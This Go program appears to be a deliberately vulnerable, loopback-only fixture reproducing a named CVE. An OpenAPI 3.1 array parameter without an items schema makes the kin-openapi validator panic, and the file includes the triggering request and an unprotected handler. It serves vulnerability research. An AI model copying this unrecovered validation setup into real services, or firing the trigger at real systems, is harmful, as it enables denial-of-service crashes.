// This is an intentionally vulnerable, loopback-only investigation fixture.
package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/http/httptest"
	"os"
	"runtime"
	"runtime/debug"
	"strings"
	"time"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

// The API contract permits an array without an items schema in OpenAPI 3.1.
// The vulnerable validator assumes Items is non-nil when decoding supplied IDs.
const catalogSpec = `openapi: 3.1.0
info:
  title: Demo catalog
  version: 1.0.0
paths:
  /items:
    get:
      parameters:
        - name: ids
          in: query
          required: false
          style: form
          explode: true
          schema:
            type: array
      responses:
        '200':
          description: Catalog items
`

func newHandler() (http.Handler, error) {
	loader := openapi3.NewLoader()
	document, err := loader.LoadFromData([]byte(catalogSpec))
	if err != nil {
		return nil, fmt.Errorf("load API contract: %w", err)
	}
	if err := document.Validate(context.Background()); err != nil {
		return nil, fmt.Errorf("validate API contract: %w", err)
	}
	router, err := gorillamux.NewRouter(document)
	if err != nil {
		return nil, fmt.Errorf("create API router: %w", err)
	}
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/health" {
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte("ok\n"))
			return
		}
		route, params, err := router.FindRoute(r)
		if err != nil {
			http.NotFound(w, r)
			return
		}
		// Unauthenticated, caller-controlled query parameters reach the affected
		// dependency before the application handles the request. No sanitiser or
		// application recovery middleware intercepts the nil-Items panic.
		err = openapi3filter.ValidateRequest(r.Context(), &openapi3filter.RequestValidationInput{
			Request:    r,
			PathParams: params,
			Route:      route,
		})
		if err != nil {
			http.Error(w, "request validation failed", http.StatusBadRequest)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte("{\"items\":[]}\n"))
	}), nil
}

// reproduce uses the real request handler without starting a server or touching
// another system. Recovery belongs to this demonstration harness, not the app.
func reproduce(handler http.Handler) (observed bool) {
	defer func() {
		if value := recover(); value != nil {
			stack := string(debug.Stack())
			_, runtimeFailure := value.(runtime.Error)
			observed = runtimeFailure && strings.Contains(fmt.Sprint(value), "invalid memory address") &&
				strings.Contains(stack, "openapi3filter")
			if observed {
				fmt.Printf("CVE-2026-100353 reproduced: validator panicked: %v\n%s", value, stack)
			} else {
				fmt.Printf("Unexpected panic; CVE reproduction not established: %v\n%s", value, stack)
			}
		}
	}()
	request := httptest.NewRequest(http.MethodGet, "/items?ids=1&ids=2", nil)
	response := httptest.NewRecorder()
	handler.ServeHTTP(response, request)
	fmt.Printf("No validator panic; response status %d\n", response.Code)
	return false
}

func main() {
	mode := flag.String("mode", "serve", "serve on loopback, or reproduce the CVE in process")
	flag.Parse()
	handler, err := newHandler()
	if err != nil {
		log.Fatal(err)
	}
	if *mode == "reproduce" {
		if !reproduce(handler) {
			os.Exit(1)
		}
		return
	}
	if *mode != "serve" {
		log.Fatal("mode must be serve or reproduce")
	}
	server := &http.Server{Addr: "127.0.0.1:8082", Handler: handler, ReadHeaderTimeout: 5 * time.Second}
	log.Printf("Intentionally vulnerable catalog: http://%s", server.Addr)
	log.Fatal(server.ListenAndServe())
}
